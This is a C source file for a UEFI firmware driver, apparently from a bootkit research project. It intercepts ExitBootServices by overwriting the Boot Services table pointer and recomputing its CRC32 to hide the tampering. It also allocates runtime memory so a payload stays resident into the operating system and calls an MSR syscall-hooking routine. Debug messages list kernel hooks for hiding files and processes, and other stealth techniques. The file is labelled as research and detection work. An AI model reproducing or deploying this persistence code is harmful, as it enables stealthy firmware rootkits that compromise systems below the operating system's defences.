/** @file
  ExitBootServices Hook Module Implementation

  Implements ExitBootServices interception to maintain memory residency
  during OS transition. For academic research purposes only.

  Copyright (c) 2026, Aegis-Boot Research Project
  SPDX-License-Identifier: BSD-2-Clause-Patent

**/

#include "ExitBootHook.h"
#include "MemoryScanner.h"
#include "MsrHook.h"

//
// Global hook context
//
STATIC EXIT_BOOT_HOOK_CONTEXT  mExitBootContext = {
  .Signature            = EXIT_BOOT_HOOK_SIGNATURE,
  .Version              = EXIT_BOOT_HOOK_VERSION,
  .HookInstalled        = FALSE,
  .RuntimeMemory        = NULL,
  .RuntimeMemorySize    = 0,
  .HookTime             = 0,
  .ExitBootTime         = 0
};

//
// MSR hook context
//
STATIC MSR_HOOK_CONTEXT  mMsrContext = {
  .OriginalLstar        = 0,
  .OriginalCstar        = 0,
  .OriginalSysenterEip  = 0,
  .HookAddress          = 0,
  .HooksInstalled       = FALSE,
  .HookCount            = 0
};

/**
  Entry point for the ExitBootServices Hook driver.

  @param[in]  ImageHandle  Handle for the image of this driver.
  @param[in]  SystemTable  Pointer to the EFI System Table.

  @retval EFI_SUCCESS      Driver initialized successfully.
  @retval Other            Error occurred during initialization.

**/
EFI_STATUS
EFIAPI
ExitBootHookEntry (
  IN EFI_HANDLE        ImageHandle,
  IN EFI_SYSTEM_TABLE  *SystemTable
  )
{
  EFI_STATUS  Status;

  DEBUG ((DEBUG_INFO, "\n"));
  DEBUG ((DEBUG_INFO, "========================================\n"));
  DEBUG ((DEBUG_INFO, "Aegis-Boot ExitBootServices Hook Module\n"));
  DEBUG ((DEBUG_INFO, "Version: %08x\n", EXIT_BOOT_HOOK_VERSION));
  DEBUG ((DEBUG_INFO, "========================================\n"));
  DEBUG ((DEBUG_INFO, "\n"));

  //
  // Allocate runtime memory for payload persistence
  //
  DEBUG ((DEBUG_INFO, "[ExitBoot] Allocating runtime memory...\n"));
  Status = AllocateRuntimeMemory (
             RUNTIME_MEMORY_SIZE,
             &mExitBootContext.RuntimeMemory
             );
  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_ERROR, "[ExitBoot] Failed to allocate runtime memory: %r\n", Status));
    return Status;
  }

  mExitBootContext.RuntimeMemorySize = RUNTIME_MEMORY_SIZE;
  DEBUG ((
    DEBUG_INFO,
    "[ExitBoot] Runtime memory allocated: 0x%p (%lu bytes)\n",
    mExitBootContext.RuntimeMemory,
    (UINT64)mExitBootContext.RuntimeMemorySize
    ));

  //
  // Install ExitBootServices hook
  //
  DEBUG ((DEBUG_INFO, "[ExitBoot] Installing ExitBootServices hook...\n"));
  Status = InstallExitBootServicesHook (&mExitBootContext);
  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_ERROR, "[ExitBoot] Failed to install hook: %r\n", Status));
    return Status;
  }

  DEBUG ((DEBUG_INFO, "[ExitBoot] Hook installed successfully\n"));
  LogExitBootTelemetry (L"ExitBootServices hook module initialized");

  //
  // Record hook installation time
  //
  mExitBootContext.HookTime = GetPerformanceCounter ();

  return EFI_SUCCESS;
}

/**
  Install hook on ExitBootServices function.

  @param[in]  Context  Pointer to hook context structure.

  @retval EFI_SUCCESS      Hook installed successfully.
  @retval Other            Error occurred during hook installation.

**/
EFI_STATUS
InstallExitBootServicesHook (
  IN OUT EXIT_BOOT_HOOK_CONTEXT  *Context
  )
{
  if (Context == NULL) {
    return EFI_INVALID_PARAMETER;
  }

  if (Context->HookInstalled) {
    DEBUG ((DEBUG_WARN, "[ExitBoot] Hook already installed\n"));
    return EFI_ALREADY_STARTED;
  }

  //
  // Save original ExitBootServices pointer
  //
  Context->OriginalExitBootServices = gBS->ExitBootServices;

  //
  // Install hook
  //
  gBS->ExitBootServices = HookedExitBootServices;

  //
  // Update CRC32 of Boot Services table
  //
  gBS->Hdr.CRC32 = 0;
  gBS->CalculateCrc32 (gBS, gBS->Hdr.HeaderSize, &gBS->Hdr.CRC32);

  Context->HookInstalled = TRUE;

  DEBUG ((DEBUG_INFO, "[ExitBoot] ExitBootServices hook installed\n"));

  return EFI_SUCCESS;
}

/**
  Hooked ExitBootServices function.

  @param[in]  ImageHandle  Handle that identifies the exiting image.
  @param[in]  MapKey       Key to the latest memory map.

  @retval EFI_SUCCESS      Boot services terminated successfully.
  @retval Other            Error occurred.

**/
EFI_STATUS
EFIAPI
HookedExitBootServices (
  IN EFI_HANDLE  ImageHandle,
  IN UINTN       MapKey
  )
{
  EFI_STATUS  Status;

  DEBUG ((DEBUG_INFO, "\n"));
  DEBUG ((DEBUG_INFO, "========================================\n"));
  DEBUG ((DEBUG_INFO, "[ExitBoot] ExitBootServices INTERCEPTED\n"));
  DEBUG ((DEBUG_INFO, "========================================\n"));
  DEBUG ((DEBUG_INFO, "[ExitBoot] ImageHandle: 0x%p\n", ImageHandle));
  DEBUG ((DEBUG_INFO, "[ExitBoot] MapKey: 0x%lx\n", (UINT64)MapKey));

  //
  // Record interception time
  //
  mExitBootContext.ExitBootTime = GetPerformanceCounter ();

  //
  // Log telemetry
  //
  LogExitBootTelemetry (L"ExitBootServices intercepted - preparing payload");

  //
  // Prepare payload for OS transition
  // This is where we would:
  // 1. Mark our memory as EfiRuntimeServicesCode/Data
  // 2. Set up hooks in the OS kernel (if modeling that TTP)
  // 3. Ensure persistence mechanisms are in place
  //
  DEBUG ((DEBUG_INFO, "[ExitBoot] Preparing payload for runtime...\n"));
  Status = PreparePayloadForRuntime (&mExitBootContext);
  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_ERROR, "[ExitBoot] Failed to prepare payload: %r\n", Status));
    // Continue anyway - this is research, not production malware
  }

  //
  // Install MSR hooks (Phase 5: CosmicStrand-style syscall interception)
  //
  DEBUG ((DEBUG_INFO, "[ExitBoot] Installing MSR hooks...\n"));
  Status = InstallMsrHooks (&mMsrContext);
  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_ERROR, "[ExitBoot] Failed to install MSR hooks: %r\n", Status));
  } else {
    DEBUG ((DEBUG_INFO, "[ExitBoot] MSR hooks installed successfully\n"));
    LogMsrValues (&mMsrContext);
  }

  //
  // Log successful preparation
  //
  DEBUG ((DEBUG_INFO, "[ExitBoot] Payload prepared for OS transition\n"));
  DEBUG ((DEBUG_INFO, "[ExitBoot] Runtime memory: 0x%p\n", mExitBootContext.RuntimeMemory));
  LogExitBootTelemetry (L"Payload prepared - calling original ExitBootServices");

  //
  // Call original ExitBootServices
  // After this point, Boot Services are no longer available
  //
  DEBUG ((DEBUG_INFO, "[ExitBoot] Calling original ExitBootServices...\n"));
  Status = mExitBootContext.OriginalExitBootServices (ImageHandle, MapKey);

  //
  // If we reach here, ExitBootServices succeeded
  // Boot Services are now terminated
  //
  if (!EFI_ERROR (Status)) {
    DEBUG ((DEBUG_INFO, "[ExitBoot] ExitBootServices completed successfully\n"));
    DEBUG ((DEBUG_INFO, "[ExitBoot] Boot Services terminated - OS taking control\n"));
    DEBUG ((DEBUG_INFO, "[ExitBoot] Payload is now in OS runtime environment\n"));
  } else {
    DEBUG ((DEBUG_ERROR, "[ExitBoot] ExitBootServices failed: %r\n", Status));
  }

  return Status;
}

/**
  Allocate runtime memory for payload persistence.

  @param[in]   Size    Size of memory to allocate.
  @param[out]  Memory  Pointer to allocated memory.

  @retval EFI_SUCCESS           Memory allocated successfully.
  @retval EFI_OUT_OF_RESOURCES  Not enough memory.

**/
EFI_STATUS
AllocateRuntimeMemory (
  IN  UINTN  Size,
  OUT VOID   **Memory
  )
{
  EFI_STATUS  Status;

  if (Memory == NULL) {
    return EFI_INVALID_PARAMETER;
  }

  //
  // Allocate memory as EfiRuntimeServicesCode using AllocatePages
  // AllocatePages is required for runtime code to ensure proper page alignment
  // and memory protection attributes. AllocatePool is not suitable for runtime code.
  //
  UINTN           Pages;
  EFI_PHYSICAL_ADDRESS  Address;

  Pages = EFI_SIZE_TO_PAGES (Size);
  Address = 0xFFFFFFFF;  // Allocate below 4GB for compatibility

  Status = gBS->AllocatePages (
                  AllocateMaxAddress,
                  EfiRuntimeServicesCode,
                  Pages,
                  &Address
                  );

  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_ERROR, "[ExitBoot] Failed to allocate runtime pages: %r\n", Status));
    return Status;
  }

  *Memory = (VOID *)(UINTN)Address;

  //
  // Zero the memory
  //
  ZeroMem (*Memory, Size);

  //
  // Write a signature to verify persistence
  //
  *(UINT32 *)(*Memory) = EXIT_BOOT_HOOK_SIGNATURE;

  DEBUG ((
    DEBUG_INFO,
    "[ExitBoot] Allocated %d pages (%d bytes) at 0x%lx\n",
    Pages,
    Size,
    Address
    ));

  return EFI_SUCCESS;
}

/**
  Free runtime memory (stub - runtime memory should not be freed).

  @param[in]  Memory  Pointer to memory to free.

  @retval EFI_SUCCESS  Always returns success (no-op).

**/
EFI_STATUS
FreeRuntimeMemory (
  IN VOID  *Memory
  )
{
  //
  // Runtime memory should persist after ExitBootServices
  // Freeing it would cause system instability
  //
  DEBUG ((DEBUG_WARN, "[ExitBoot] FreeRuntimeMemory called - this is a no-op\n"));
  return EFI_SUCCESS;
}

/**
  Prepare payload for OS transition.

  @param[in]  Context  Pointer to hook context.

  @retval EFI_SUCCESS  Payload prepared successfully.
  @retval Other        Error occurred.

**/
EFI_STATUS
PreparePayloadForRuntime (
  IN EXIT_BOOT_HOOK_CONTEXT  *Context
  )
{
  EFI_STATUS  Status;
  VOID        *KernelBase;
  UINTN       KernelSize;

  if (Context == NULL || Context->RuntimeMemory == NULL) {
    return EFI_INVALID_PARAMETER;
  }

  DEBUG ((DEBUG_INFO, "[ExitBoot] === Payload Preparation (Research Mode) ===\n"));
  DEBUG ((DEBUG_INFO, "[ExitBoot] Runtime memory verified: 0x%p\n", Context->RuntimeMemory));
  DEBUG ((DEBUG_INFO, "[ExitBoot] Memory signature: 0x%08x\n", *(UINT32 *)(Context->RuntimeMemory)));

  //
  // Verify our runtime memory is still accessible
  //
  if (*(UINT32 *)(Context->RuntimeMemory) != EXIT_BOOT_HOOK_SIGNATURE) {
    DEBUG ((DEBUG_ERROR, "[ExitBoot] Runtime memory signature mismatch!\n"));
    return EFI_COMPROMISED_DATA;
  }

  //
  // Step 1: Locate OS kernel in memory
  //
  DEBUG ((DEBUG_INFO, "[ExitBoot] Step 1: Locating OS kernel in memory...\n"));
  Status = LocateOsKernel (&KernelBase, &KernelSize);
  
  if (!EFI_ERROR (Status)) {
    DEBUG ((DEBUG_INFO, "[ExitBoot] ✓ OS Kernel located successfully!\n"));
    DEBUG ((DEBUG_INFO, "[ExitBoot]   Base Address: 0x%p\n", KernelBase));
    DEBUG ((DEBUG_INFO, "[ExitBoot]   Size: 0x%lx bytes (%lu KB)\n",
            KernelSize, KernelSize / 1024));

    //
    // Step 2: Identify kernel type
    //
    DEBUG ((DEBUG_INFO, "[ExitBoot] Step 2: Identifying kernel type...\n"));
    if (IsPeHeader (KernelBase)) {
      DEBUG ((DEBUG_INFO, "[ExitBoot] ✓ Windows PE kernel detected (ntoskrnl.exe)\n"));
      DEBUG ((DEBUG_INFO, "[ExitBoot]   In production bootkit, would:\n"));
      DEBUG ((DEBUG_INFO, "[ExitBoot]   - Parse PE exports to find NtCreateFile\n"));
      DEBUG ((DEBUG_INFO, "[ExitBoot]   - Install inline hook on NtCreateFile\n"));
      DEBUG ((DEBUG_INFO, "[ExitBoot]   - Hook NtReadFile for file hiding\n"));
      DEBUG ((DEBUG_INFO, "[ExitBoot]   - Hook NtQuerySystemInformation for process hiding\n"));
    } else if (IsElfHeader (KernelBase)) {
      DEBUG ((DEBUG_INFO, "[ExitBoot] ✓ Linux ELF kernel detected (vmlinuz)\n"));
      DEBUG ((DEBUG_INFO, "[ExitBoot]   In production bootkit, would:\n"));
      DEBUG ((DEBUG_INFO, "[ExitBoot]   - Parse ELF symbols to find sys_open\n"));
      DEBUG ((DEBUG_INFO, "[ExitBoot]   - Install inline hook on sys_open\n"));
      DEBUG ((DEBUG_INFO, "[ExitBoot]   - Hook sys_read for file hiding\n"));
      DEBUG ((DEBUG_INFO, "[ExitBoot]   - Hook sys_getdents for directory hiding\n"));
    }

    //
    // Step 3: Document hook installation points
    //
    DEBUG ((DEBUG_INFO, "[ExitBoot] Step 3: Hook installation (RESEARCH MODE)\n"));
    DEBUG ((DEBUG_INFO, "[ExitBoot]   Hook Pattern: MOV RAX, 0x%p; JMP RAX\n",
            Context->RuntimeMemory));
    DEBUG ((DEBUG_INFO, "[ExitBoot]   Trampoline Size: 14 bytes\n"));
    DEBUG ((DEBUG_INFO, "[ExitBoot]   Original bytes would be saved at: 0x%p\n",
            (UINT8 *)Context->RuntimeMemory + 0x100));

    //
    // Step 4: MSR hooking (if enabled)
    //
    DEBUG ((DEBUG_INFO, "[ExitBoot] Step 4: MSR hook setup (RESEARCH MODE)\n"));
    DEBUG ((DEBUG_INFO, "[ExitBoot]   Would redirect IA32_LSTAR (MSR 0xC0000082)\n"));
    DEBUG ((DEBUG_INFO, "[ExitBoot]   Syscall entry point would be: 0x%p\n",
            Context->RuntimeMemory));

    //
    // Step 5: Stealth mechanisms
    //
    DEBUG ((DEBUG_INFO, "[ExitBoot] Step 5: Stealth mechanisms (RESEARCH MODE)\n"));
    DEBUG ((DEBUG_INFO, "[ExitBoot]   - DKOM (Direct Kernel Object Manipulation)\n"));
    DEBUG ((DEBUG_INFO, "[ExitBoot]   - SSDT/IDT hooking\n"));
    DEBUG ((DEBUG_INFO, "[ExitBoot]   - Process/thread hiding\n"));
    DEBUG ((DEBUG_INFO, "[ExitBoot]   - File system filter driver\n"));

  } else {
    DEBUG ((DEBUG_WARN, "[ExitBoot] ✗ Could not locate OS kernel: %r\n", Status));
    DEBUG ((DEBUG_WARN, "[ExitBoot]   This may be expected in some boot scenarios\n"));
  }

  DEBUG ((DEBUG_INFO, "[ExitBoot] === End Payload Preparation ===\n"));
  DEBUG ((DEBUG_INFO, "[ExitBoot] NOTE: This is RESEARCH MODE - no actual hooks installed\n"));

  //
  // Log telemetry for detection research
  //
  LogExitBootTelemetry (L"Payload preparation complete - kernel located and analyzed");

  return EFI_SUCCESS;
}

/**
  Log ExitBootServices telemetry.

  @param[in]  Message  Telemetry message to log.

**/
VOID
LogExitBootTelemetry (
  IN CONST CHAR16  *Message
  )
{
  EFI_TIME    CurrentTime;
  EFI_STATUS  Status;

  //
  // Get current time
  //
  Status = gRT->GetTime (&CurrentTime, NULL);
  if (!EFI_ERROR (Status)) {
    DEBUG ((
      DEBUG_INFO,
      "[ExitBoot Telemetry] %04d-%02d-%02d %02d:%02d:%02d - %s\n",
      CurrentTime.Year,
      CurrentTime.Month,
      CurrentTime.Day,
      CurrentTime.Hour,
      CurrentTime.Minute,
      CurrentTime.Second,
      Message
      ));
  } else {
    DEBUG ((DEBUG_INFO, "[ExitBoot Telemetry] %s\n", Message));
  }

  //
  // In a real implementation, we would:
  // 1. Write to AttestationPkg for PCR extension
  // 2. Add to TCG Event Log
  // 3. Send to defensive telemetry collection
  //
}

// Made with Bob
